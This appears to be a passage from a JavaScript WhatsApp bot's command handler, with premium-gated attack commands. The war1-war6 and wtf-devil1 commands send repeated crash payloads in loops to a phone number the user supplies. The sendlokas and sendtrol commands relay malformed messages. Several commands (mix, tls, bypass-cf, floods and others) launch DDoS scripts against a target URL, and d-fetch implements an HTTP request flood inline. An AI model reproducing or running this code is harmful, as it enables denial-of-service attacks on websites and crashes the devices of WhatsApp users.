await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'war6': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'war5': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'war4': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
//Special
case 'mix': {
if (!isPremium) return reply(msg.anggazyyprem)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./ddos/mix.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'tls': {
if (!isPremium) return reply(msg.anggazyyprem)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./ddos/tls-arz.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'tls-v2': {
if (!isPremium) return reply(msg.anggazyyprem)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./ddos/tls.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'kilua': {
if (!isPremium) return reply(msg.anggazyyprem)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./ddos/kilua.js ${url} ${time} ${thread} proxy.txt ${rate} ua.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'tls-bypass': {
if (!isPremium) return reply(msg.anggazyyprem)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./ddos/tls-bypass.js ${url} ${time} ${rate} ${thread}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'bypass-cf': {
if (!isPremium) return reply(msg.anggazyyprem)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./ddos/bypass.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'tls-vip': {
if (!isPremium) return reply(msg.anggazyyprem)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./ddos/tlsvip.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'floods': {
if (!isPremium) return reply(msg.anggazyyprem)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./ddos/floods.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'egao': {
if (!isPremium) return reply(msg.anggazyyprem)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./ddos/hentai.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'xchrome': {
if (!isPremium) return reply(msg.anggazyyprem)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./ddos/chromev3.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'd-fetch': {
if (!isPremium) return reply(msg.anggazyyprem)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]

if (args.length === 4 && url && time && thread && rate) {
let attack = () => {
let totalRequests = 0
let threads = []

for (let j = 0; j < thread; j++) {
threads.push(
new Promise((resolve, reject) => {
let interval = setInterval(() => {
for (let j = 0; j < rate; j++) {
fetch(url)
.then(() => {
totalRequests++
console.log(`Attacking => ${url} Total Requests: ${totalRequests} Duration: ${time}`)
})
.catch(err => {})
}
}, 750)
setTimeout(() => {
clearInterval(interval)
resolve()
}, time)
})
)
}

Promise.all(threads)
.then(() => console.log("Attack complete"))
.catch(err => console.error("Error in attack:", err))
}

attack()
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case "check-host": {
if (!q) return reply (`Example : ${m.prefix + m.command} https://nxnn.com`)
let msg = { viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": "p"
    },
    "body": {
      "text": "Klik Chech Host Untuk Untuk Memeriksa Web"
    },
    "footer": {
      "text": "© Anggazyy 404 Vault"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": `{ display_text : 'Check Host' , url : "https://check-host.net/check-http?host=${q}", merchant_url : "https://check-host.net/check-http?host=${q}" }`
        }
      ],
      "messageParamsJson": ""
    }
  }
}
}
}
anggazyy.relayMessage(m.chat, msg, {});
}
break
case 'war3': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'war2': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break

case 'sendlokas': case 'sendlokas3': case 'sendlokas4': case 'sendlokas5': {
if (!isPremium) return reply(msg.anggazyyprem)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/anggazyy.jpg') }, { upload: anggazyy.waUploadToServer })
var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© Devil 4.0 *Gen 1* Update${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:xbug2})
anggazyy.relayMessage(bnnd, liveLocation.message, { messageId: liveLocation.key.id })
sticSukses(from)
}
break
//=================================================//
case 'sendlokas2': {
if (!isPremium) return reply(msg.anggazyyprem)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/anggazyy.jpg') }, { upload: anggazyy.waUploadToServer })
var location = generateWAMessageFromContent(from, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© Devil 4.0 *Gen 1* Update${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:xbug2})
anggazyy.relayMessage(bnnd, location.message, { messageId: location.key.id })
sticSukses(from)
}
break
//=================================================//
case 'sendtrol1': {
if (!isPremium) return reply(msg.anggazyyprem)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/anggazyy.jpg') }, { upload: anggazyy.waUploadToServer })
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
 "orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© Devil 4.0 *Gen 1* Update${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./media/anggazyy.jpg'),
"orderTitle": `© Anggazyy 202${ngazap(prefix)}`,
"sellerJid": "6285714170944@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: from, quoted:xbug2})
anggazyy.relayMessage(bnnd, order.message, { messageId: order.key.id })
sticSukses(from)
}
break
case 'war1': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'wtf-devil1': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
